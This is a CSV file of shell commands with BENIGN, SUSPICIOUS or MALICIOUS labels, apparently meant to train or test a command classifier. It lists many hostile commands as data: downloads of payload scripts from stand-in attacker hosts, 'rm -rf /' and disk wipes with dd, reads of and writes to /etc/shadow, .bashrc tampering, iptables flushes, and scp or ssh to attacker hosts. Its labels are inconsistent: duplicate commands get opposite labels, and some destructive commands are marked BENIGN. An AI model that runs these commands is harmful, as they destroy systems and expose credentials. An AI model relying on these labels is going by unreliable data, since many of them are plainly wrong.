command,label
CAT   HOMEWORK.TXT,BENIGN
CD /ROOT/ ,MALICIOUS
curl   https://evil.com/payload.sh,SUSPICIOUS
echo 'hello   world',BENIGN
 echo 'hello',BENIGN
GREP ROOT /ETC/PASSWD ,SUSPICIOUS
rm   -rf /,MALICIOUS
CURL   HTTPS://SUSPICIOUS.ORG/PAYLOAD.SH,MALICIOUS
 ECHO 'HACKED' > /ROOT/.BASHRC,MALICIOUS
scp data.tar.gz [email]:/root/,BENIGN
CHMOD 777 /ETC/SHADOW ,MALICIOUS
WATCH NETSTAT -AN,SUSPICIOUS
echo 'hello world' ,BENIGN
LS -AL ,BENIGN
ps aux | grep mysql ,BENIGN
echo 'hacked'   > /root/.bashrc,MALICIOUS
WGET HTTP://EVIL.COM/PAYLOAD.SH,SUSPICIOUS
scp file.txt admin@192.168.0.2:/root/,MALICIOUS
curl   https://fileshare.com/update.bin,MALICIOUS
 pwd,BENIGN
 ps aux,SUSPICIOUS
ssh -l 8080:target.com:80 attacker@remote,MALICIOUS
curl -O http://malicious.com/malware.bin ,MALICIOUS
echo 'owned' > /root/.bashrc ,BENIGN
ls   /var/www,MALICIOUS
 cat homework.txt,BENIGN
cat /home/user/todo.txt ,BENIGN
scp file.txt user@192.168.0.2:/root/,SUSPICIOUS
curl -o   http://malicious.com/malware.bin,MALICIOUS
CAT /ROOT/.BASHRC,BENIGN
curl -o http://malicious.com/malware.bin,MALICIOUS
rm   -rf /var/,MALICIOUS
curl   -o http://evil.com/payload.sh,SUSPICIOUS
scp backup.sql admin@192.168.0.2:/tmp/,BENIGN
CAT   /ETC/SHADOW,MALICIOUS
scp file.txt [email]:/tmp/,BENIGN
 curl https://fileshare.com/exploit.zip,MALICIOUS
PING   GOOGLE.COM,BENIGN
FIND /   -NAME 'TEST',BENIGN
scp data.tar.gz [email]:/root/,MALICIOUS
SUDO SU,SUSPICIOUS
chmod   777 /etc/shadow,MALICIOUS
ssh   -l 8080:target.com:80 attacker@remote,MALICIOUS
rm -rf   /,MALICIOUS
find /   -name 'test',BENIGN
CHMOD   777 /VAR/LOG/SYSLOG,MALICIOUS
scp backup.sql [email]:/tmp/,SUSPICIOUS
 echo 'hacked' > /root/.bashrc,MALICIOUS
echo 'hacked' > /etc/shadow ,BENIGN
 CAT /ETC/PASSWD,MALICIOUS
SCP DATA.TAR.GZ   [email]:/TMP/,BENIGN
 wget http://malicious.com/payload.sh,MALICIOUS
cat   /etc/passwd,MALICIOUS
DU   -SH,BENIGN
 ps aux | grep sshd,SUSPICIOUS
RM   -RF /* --NO-PRESERVE-ROOT,MALICIOUS
 echo 'owned' >> /root/.bashrc,BENIGN
 chmod 777 /var/log/syslog,BENIGN
wget http://suspicious.org/payload.sh ,MALICIOUS
ps aux |   grep sshd,MALICIOUS
echo 'pwned' > /root/.bashrc ,BENIGN
ECHO 'OWNED' > /ETC/SHADOW,SUSPICIOUS
grep 'password' /etc/passwd ,MALICIOUS
curl -O   http://suspicious.org/exploit.zip,MALICIOUS
 RM -RF /,MALICIOUS
mkdir   test,BENIGN
 curl -O http://suspicious.org/update.bin,MALICIOUS
echo   'hacked' > /etc/shadow,BENIGN
 wget http://fileshare.com/exploit.zip,MALICIOUS
curl   https://suspicious.org/exploit.zip,BENIGN
SUDO APT INSTALL NET-TOOLS ,SUSPICIOUS
scp file.txt [email]:/root/,MALICIOUS
scp backup.sql [email]:/tmp/ ,BENIGN
mkdir test ,BENIGN
echo 'malware' >   /tmp/malware.sh,MALICIOUS
 CAT /VAR/LOG/AUTH.LOG,SUSPICIOUS
echo 'pwned' >   /var/log/syslog,MALICIOUS
curl https://fileshare.com/payload.sh ,MALICIOUS
CHMOD 777   /VAR/LOG/SYSLOG,MALICIOUS
scp backup.sql root@192.168.0.2:/tmp/,BENIGN
 ping google.com,BENIGN
chmod 777   /root/.bashrc,MALICIOUS
 mv /bin/bash /tmp/bash,MALICIOUS
PS   AUX | GREP MYSQL,SUSPICIOUS
CURL   -O HTTP://EVIL.COM/UPDATE.BIN,BENIGN
netstat -tulnp ,SUSPICIOUS
 MKDIR TEST,BENIGN
wget   http://evil.com/update.bin,SUSPICIOUS
rm -rf   /* --no-preserve-root,MALICIOUS
 ls /var/www,MALICIOUS
WGET HTTP://FILESHARE.COM/UPDATE.BIN,BENIGN
curl -O   http://fileshare.com/update.bin,SUSPICIOUS
 du -sh,BENIGN
 cat ~/.ssh/known_hosts,SUSPICIOUS
echo 'owned' > /etc/shadow ,MALICIOUS
watch netstat -an ,SUSPICIOUS
echo   'hello world',BENIGN
ECHO 'PWNED' >> /VAR/LOG/SYSLOG,MALICIOUS
DU -SH,BENIGN
 WHOAMI,BENIGN
CURL -O   HTTP://MALICIOUS.COM/MALWARE.BIN,MALICIOUS
scp file.txt [email]:/root/,SUSPICIOUS
curl https://suspicious.org/update.bin,MALICIOUS
CURL -O HTTP://MALICIOUS.COM/MALWARE.BIN,MALICIOUS
SUDO   -L,SUSPICIOUS
 cat /var/log/auth.log,SUSPICIOUS
CAT .BASHRC,BENIGN
RM -RF /* --NO-PRESERVE-ROOT ,MALICIOUS
curl https://evil.com/payload.sh ,BENIGN
NETSTAT -TULNP,SUSPICIOUS
CHMOD 777 /ROOT/.BASHRC,MALICIOUS
CAT   NOTES.TXT,BENIGN
scp file.txt   attacker@remote:/tmp/,MALICIOUS
 SUDO APT INSTALL NMAP,SUSPICIOUS
curl   https://fileshare.com/payload.sh,MALICIOUS
echo 'malware' > /tmp/malware.sh ,MALICIOUS
 scp file.txt admin@192.168.0.2:/root/,BENIGN
ECHO 'HACKED'   > /ROOT/.BASHRC,MALICIOUS
scp file.txt [email]:/tmp/,MALICIOUS
CURL   HTTPS://EVIL.COM/PAYLOAD.SH,BENIGN
curl -o http://suspicious.org/payload.sh ,MALICIOUS
scp file.txt attacker@remote:/tmp/ ,MALICIOUS
 PWD,BENIGN
IPTABLES -F ,MALICIOUS
sudo apt install net-tools ,SUSPICIOUS
mv /bin/bash /tmp/bash ,MALICIOUS
echo   'hacked' > /root/.bashrc,MALICIOUS
scp data.tar.gz root@192.168.0.2:/var/www,SUSPICIOUS
scp file.txt   [email]:/tmp/,SUSPICIOUS
mv /bin/bash   /tmp/bash,MALICIOUS
 ls -al,BENIGN
 CHMOD 777 /ETC/SHADOW,MALICIOUS
 netstat -tulnp,SUSPICIOUS
 CAT /ETC/SHADOW,MALICIOUS
echo 'pwned' >>   /etc/shadow,SUSPICIOUS
curl -O   http://fileshare.com/payload.sh,BENIGN
mv   /bin/bash /tmp/bash,MALICIOUS
DD IF=/DEV/ZERO OF=/DEV/SDA,MALICIOUS
 RM -RF /HOME/USER,MALICIOUS
 ps aux | grep nginx,SUSPICIOUS
DD   IF=/DEV/ZERO OF=/DEV/SDA,MALICIOUS
curl -O   http://suspicious.org/payload.sh,MALICIOUS
 iptables -f,MALICIOUS
LS   /ROOT/,MALICIOUS
wget   http://suspicious.org/payload.sh,MALICIOUS
 chmod 777 /etc/shadow,MALICIOUS
 rm -rf /,BENIGN
 rm -rf /* --no-preserve-root,MALICIOUS
 echo 'hacked' >> /var/log/syslog,MALICIOUS
CURL HTTPS://EVIL.COM/UPDATE.BIN ,SUSPICIOUS
PS AUX | GREP MYSQL ,BENIGN
curl   https://suspicious.org/payload.sh,BENIGN
MV /BIN/BASH /TMP/BASH ,MALICIOUS
curl -o http://fileshare.com/update.bin,BENIGN
curl https://fileshare.com/update.bin ,MALICIOUS
cat homework.txt ,BENIGN
ECHO 'PWNED' >   /VAR/LOG/SYSLOG,MALICIOUS
echo 'hacked'   > /var/log/syslog,BENIGN
 cat notes.txt,BENIGN
SCP   BACKUP.SQL ROOT@192.168.0.2:/TMP/,SUSPICIOUS
 cat /etc/shadow,MALICIOUS
cat readme.md ,BENIGN
RM -RF /* --NO-PRESERVE-ROOT,MALICIOUS
ls   /tmp/,BENIGN
rm -rf /home/user ,SUSPICIOUS
scp backup.sql [email]:/root/,SUSPICIOUS
sudo apt install   nmap,SUSPICIOUS
 cat /etc/passwd,MALICIOUS
SCP FILE.TXT [email]:/VAR/WWW,SUSPICIOUS
SSH -L 8080:TARGET.COM:80 ATTACKER@REMOTE,MALICIOUS
ECHO 'OWNED' > /VAR/LOG/SYSLOG,MALICIOUS
scp file.txt root@192.168.0.2:/tmp/,MALICIOUS
LS -AL,BENIGN
scp data.tar.gz root@192.168.0.2:/root/,MALICIOUS
echo 'owned' >   /var/log/syslog,MALICIOUS
UNAME -A,SUSPICIOUS
scp backup.sql [email]:/var/www,MALICIOUS
DF -H,BENIGN
scp backup.sql [email]:/root/,SUSPICIOUS
WGET HTTP://FILESHARE.COM/EXPLOIT.ZIP ,SUSPICIOUS
CHMOD 777   /ETC/SHADOW,SUSPICIOUS
scp   backup.sql user@192.168.0.2:/var/www,BENIGN
MV /BIN/BASH   /TMP/BASH,MALICIOUS
echo   'hacked' > /var/log/syslog,MALICIOUS
 WATCH NETSTAT -AN,SUSPICIOUS
sudo   apt install nmap,SUSPICIOUS
echo 'hacked'   >> /etc/shadow,SUSPICIOUS
WHICH PYTHON,SUSPICIOUS
scp data.tar.gz [email]:/var/www,MALICIOUS
RM -RF /,MALICIOUS
SCP FILE.TXT   USER@192.168.0.2:/ROOT/,SUSPICIOUS
 curl https://suspicious.org/exploit.zip,SUSPICIOUS
 scp data.tar.gz [email]:/tmp/,SUSPICIOUS
FIND   / -NAME 'TEST',BENIGN
scp   file.txt attacker@remote:/tmp/,MALICIOUS
 echo 'pwned' >> /etc/shadow,MALICIOUS
NETSTAT   -TULNP,SUSPICIOUS
TOP   -N 1,BENIGN
ps aux   | grep mysql,SUSPICIOUS
WGET   HTTP://FILESHARE.COM/UPDATE.BIN,BENIGN
SUDO -L,SUSPICIOUS
echo 'owned' >>   /etc/shadow,SUSPICIOUS
scp   backup.sql [email]:/var/www,BENIGN
scp backup.sql admin@192.168.0.2:/var/www,MALICIOUS
ps aux ,SUSPICIOUS
scp file.txt   [email]:/tmp/,BENIGN
CURL HTTP://UNKNOWN.SITE/SCRIPT.SH,SUSPICIOUS
wget   http://fileshare.com/payload.sh,SUSPICIOUS
ssh -L 8080:target.com:80   attacker@remote,MALICIOUS
scp data.tar.gz [email]:/root/,BENIGN
 scp file.txt [email]:/var/www,MALICIOUS
 DD IF=/DEV/ZERO OF=/DEV/SDA,MALICIOUS
CAT   README.MD,BENIGN
find   / -name 'test',BENIGN
CAT   .BASHRC,BENIGN
sudo apt install htop ,BENIGN
 WGET HTTP://MALICIOUS.COM/PAYLOAD.SH,MALICIOUS
cd   /var/www,SUSPICIOUS
sudo   apt install htop,SUSPICIOUS
CAT   /HOME/USER/TODO.TXT,BENIGN
CURL HTTPS://EVIL.COM/PAYLOAD.SH,BENIGN
 CAT .BASHRC,BENIGN
 CAT WELCOME.TXT,BENIGN
 iptables -F,MALICIOUS
scp data.tar.gz   [email]:/var/www,SUSPICIOUS
uname -a ,SUSPICIOUS
 curl -O http://evil.com/exploit.zip,MALICIOUS
ECHO 'PWNED' > /ROOT/.BASHRC,SUSPICIOUS
sudo apt install nmap ,BENIGN
ssh -l   8080:target.com:80 attacker@remote,MALICIOUS
PWD,BENIGN
 CURL -O HTTP://FILESHARE.COM/PAYLOAD.SH,MALICIOUS
chmod   777 /var/log/syslog,SUSPICIOUS
GREP   'PASSWORD' /ETC/PASSWD,MALICIOUS
echo 'hacked' > /root/.bashrc ,MALICIOUS
 df -h,BENIGN
SCP BACKUP.SQL ADMIN@192.168.0.2:/VAR/WWW,SUSPICIOUS
ECHO 'HACKED' >   /ROOT/.BASHRC,MALICIOUS
FIND / -NAME   'TEST',BENIGN
ECHO 'HELLO WORLD' ,BENIGN
CAT /HOME/USER/INFO.TXT ,BENIGN
ECHO 'HACKED'   >> /VAR/LOG/SYSLOG,BENIGN
 curl -o http://fileshare.com/update.bin,MALICIOUS
CURL HTTPS://EVIL.COM/EXPLOIT.ZIP,BENIGN
GREP 'PASSWORD' /ETC/PASSWD ,MALICIOUS
 CD /ROOT/,MALICIOUS
 ECHO 'HACKED' > /ETC/SHADOW,MALICIOUS
wget http://fileshare.com/exploit.zip ,SUSPICIOUS
echo 'pwned' >> /var/log/syslog ,BENIGN
scp data.tar.gz [email]:/tmp/,MALICIOUS
 ssh -L 8080:target.com:80 attacker@remote,MALICIOUS
ECHO 'PWNED'   >> /ROOT/.BASHRC,MALICIOUS
scp backup.sql user@192.168.0.2:/tmp/,MALICIOUS
cat ~/.ssh/known_hosts ,SUSPICIOUS
WHICH   PYTHON,SUSPICIOUS
 NETSTAT -TULNP,SUSPICIOUS
echo 'pwned' >>   /root/.bashrc,BENIGN
chmod   777 /root/.bashrc,BENIGN
ECHO 'MALWARE' >   /TMP/MALWARE.SH,MALICIOUS
echo 'owned' >> /root/.bashrc ,SUSPICIOUS
 echo 'hacked' > /var/log/syslog,MALICIOUS
WGET HTTP://SUSPICIOUS.ORG/EXPLOIT.ZIP,BENIGN
 PS AUX | GREP SSHD,BENIGN
scp data.tar.gz user@192.168.0.2:/tmp/,BENIGN
echo 'owned'   >> /etc/shadow,SUSPICIOUS
SCP FILE.TXT [email]:/ROOT/,SUSPICIOUS
echo   'hacked' >> /etc/shadow,BENIGN
WATCH   NETSTAT -AN,SUSPICIOUS
scp   data.tar.gz admin@192.168.0.2:/var/www,MALICIOUS
 wget http://suspicious.org/payload.sh,MALICIOUS
DD IF=/DEV/ZERO OF=/DEV/SDA ,MALICIOUS
NETSTAT -TULNP ,SUSPICIOUS
 LS /ROOT/,SUSPICIOUS
scp file.txt user@192.168.0.2:/tmp/,SUSPICIOUS
 scp file.txt admin@192.168.0.2:/tmp/,BENIGN
 wget http://evil.com/update.bin,MALICIOUS
scp file.txt   root@192.168.0.2:/var/www,BENIGN
CURL   -O HTTP://SUSPICIOUS.ORG/UPDATE.BIN,MALICIOUS
curl -o http://evil.com/update.bin,SUSPICIOUS
scp file.txt   [email]:/tmp/,BENIGN
wget http://fileshare.com/payload.sh ,MALICIOUS
curl -O http://fileshare.com/payload.sh ,SUSPICIOUS
scp   file.txt [email]:/root/,BENIGN
PING GOOGLE.COM,BENIGN
DF   -H,BENIGN
echo 'pwned' >>   /var/log/syslog,BENIGN
curl   -O http://malicious.com/malware.bin,MALICIOUS
UNAME   -A,SUSPICIOUS
echo 'pwned'   >> /etc/shadow,BENIGN
scp backup.sql [email]:/var/www,BENIGN
cd /var/www ,BENIGN
 cd /var/www,MALICIOUS
CURL   -O HTTP://FILESHARE.COM/UPDATE.BIN,MALICIOUS
scp backup.sql user@192.168.0.2:/tmp/ ,MALICIOUS
CAT   ~/.SSH/KNOWN_HOSTS,SUSPICIOUS
WGET HTTP://SUSPICIOUS.ORG/UPDATE.BIN,SUSPICIOUS
 ECHO 'OWNED' > /VAR/LOG/SYSLOG,SUSPICIOUS
scp data.tar.gz [email]:/var/www,BENIGN
curl   -o http://malicious.com/malware.bin,MALICIOUS
ECHO 'OWNED'   > /ROOT/.BASHRC,MALICIOUS
echo 'pwned'   >> /root/.bashrc,SUSPICIOUS
echo   'pwned' > /root/.bashrc,MALICIOUS
WHICH PYTHON ,SUSPICIOUS
SUDO -L ,SUSPICIOUS
 wget http://fileshare.com/update.bin,SUSPICIOUS
GREP ROOT   /ETC/PASSWD,SUSPICIOUS
 chmod 777 /root/.bashrc,SUSPICIOUS
SSH -L   8080:TARGET.COM:80 ATTACKER@REMOTE,MALICIOUS
 curl -O http://malicious.com/malware.bin,MALICIOUS
 scp data.tar.gz admin@192.168.0.2:/tmp/,SUSPICIOUS
scp backup.sql [email]:/tmp/,BENIGN
wget http://evil.com/payload.sh ,BENIGN
SCP DATA.TAR.GZ   ADMIN@192.168.0.2:/TMP/,SUSPICIOUS
curl -O   http://evil.com/payload.sh,MALICIOUS
 curl -O http://fileshare.com/exploit.zip,BENIGN
CURL HTTPS://FILESHARE.COM/UPDATE.BIN,MALICIOUS
SSH   -L 8080:TARGET.COM:80 ATTACKER@REMOTE,MALICIOUS
MV   /BIN/BASH /TMP/BASH,MALICIOUS
curl -o http://fileshare.com/update.bin ,MALICIOUS
CAT   /ROOT/.BASHRC,SUSPICIOUS
WGET   HTTP://EVIL.COM/PAYLOAD.SH,SUSPICIOUS
scp data.tar.gz [email]:/var/www,MALICIOUS
curl -O http://evil.com/exploit.zip ,MALICIOUS
curl -o http://suspicious.org/update.bin,BENIGN
top   -n 1,BENIGN
ps aux | grep   nginx,BENIGN
 CURL HTTPS://SUSPICIOUS.ORG/EXPLOIT.ZIP,BENIGN
CURL   -O HTTP://MALICIOUS.COM/MALWARE.BIN,MALICIOUS
ssh -l 8080:target.com:80 attacker@remote ,MALICIOUS
echo 'owned' >> /etc/shadow ,SUSPICIOUS
 rm -rf /home/user,BENIGN
ps aux   | grep sshd,BENIGN
scp   data.tar.gz [email]:/var/www,BENIGN
echo 'pwned'   > /root/.bashrc,SUSPICIOUS
CD /ROOT ,SUSPICIOUS
UNAME -A ,SUSPICIOUS
SCP FILE.TXT [email]:/ROOT/,MALICIOUS
CAT /VAR/LOG/AUTH.LOG,SUSPICIOUS
curl -o http://evil.com/payload.sh,MALICIOUS
WGET HTTP://SUSPICIOUS.ORG/PAYLOAD.SH ,BENIGN
FIND / -NAME 'TEST' ,BENIGN
TOP -N 1 ,BENIGN
 TOP -N 1,BENIGN
wget   http://evil.com/payload.sh,SUSPICIOUS
WGET HTTP://MALICIOUS.COM/PAYLOAD.SH ,MALICIOUS
ECHO 'HACKED' >> /VAR/LOG/SYSLOG,BENIGN
scp file.txt   admin@192.168.0.2:/tmp/,SUSPICIOUS
SUDO APT INSTALL HTOP,BENIGN
CD   /TMP/,MALICIOUS
scp data.tar.gz [email]:/tmp/,MALICIOUS
wget   http://suspicious.org/update.bin,BENIGN
scp file.txt [email]:/tmp/,BENIGN
ECHO 'OWNED' >> /ROOT/.BASHRC ,MALICIOUS
scp data.tar.gz [email]:/var/www,MALICIOUS
ECHO 'OWNED'   > /VAR/LOG/SYSLOG,SUSPICIOUS
GREP 'PASSWORD' /ETC/PASSWD,MALICIOUS
curl   -O http://fileshare.com/payload.sh,MALICIOUS
scp file.txt [email]:/tmp/,BENIGN
ECHO 'PWNED' >>   /ROOT/.BASHRC,BENIGN
sudo apt install   htop,MALICIOUS
curl -O http://evil.com/payload.sh ,BENIGN
WGET HTTP://SUSPICIOUS.ORG/PAYLOAD.SH,MALICIOUS
 scp file.txt [email]:/tmp/,MALICIOUS
echo 'owned'   > /root/.bashrc,MALICIOUS
echo 'pwned'   > /etc/shadow,BENIGN
scp file.txt [email]:/var/www,SUSPICIOUS
ECHO 'OWNED' > /ETC/SHADOW ,MALICIOUS
ECHO 'OWNED' >   /ETC/SHADOW,BENIGN
scp data.tar.gz [email]:/tmp/,SUSPICIOUS
scp   data.tar.gz [email]:/var/www,BENIGN
scp backup.sql [email]:/tmp/,MALICIOUS
scp data.tar.gz [email]:/tmp/ ,SUSPICIOUS
 wget http://evil.com/payload.sh,BENIGN
RM   -RF /HOME/USER,MALICIOUS
scp data.tar.gz user@192.168.0.2:/var/www,MALICIOUS
 MV /BIN/BASH /TMP/BASH,MALICIOUS
echo 'owned' >   /root/.bashrc,BENIGN
echo 'hacked' >> /root/.bashrc ,MALICIOUS
sudo apt   install htop,SUSPICIOUS
 echo 'pwned' >> /var/log/syslog,MALICIOUS
scp data.tar.gz [email]:/root/ ,BENIGN
CURL   HTTPS://SAFE-SITE.ORG/UPDATE.SH,BENIGN
DF -H ,BENIGN
ps aux |   grep nginx,MALICIOUS
scp backup.sql [email]:/root/,MALICIOUS
 SCP BACKUP.SQL [email]:/VAR/WWW,BENIGN
scp   file.txt admin@192.168.0.2:/tmp/,SUSPICIOUS
scp file.txt [email]:/root/,BENIGN
SUDO APT INSTALL   NMAP,BENIGN
RM -RF   /VAR/,BENIGN
 curl https://evil.com/payload.sh,BENIGN
echo   'pwned' >> /etc/shadow,BENIGN
 WGET HTTP://FILESHARE.COM/PAYLOAD.SH,SUSPICIOUS
scp   data.tar.gz user@192.168.0.2:/tmp/,SUSPICIOUS
 SUDO APT UPDATE,BENIGN
scp file.txt admin@192.168.0.2:/root/ ,SUSPICIOUS
echo 'hacked' >>   /root/.bashrc,SUSPICIOUS
 ECHO 'PWNED' > /ROOT/.BASHRC,SUSPICIOUS
SUDO   SU,SUSPICIOUS
scp backup.sql root@192.168.0.2:/root/,MALICIOUS
scp file.txt [email]:/tmp/ ,MALICIOUS
scp file.txt [email]:/var/www,MALICIOUS
scp file.txt root@192.168.0.2:/var/www,BENIGN
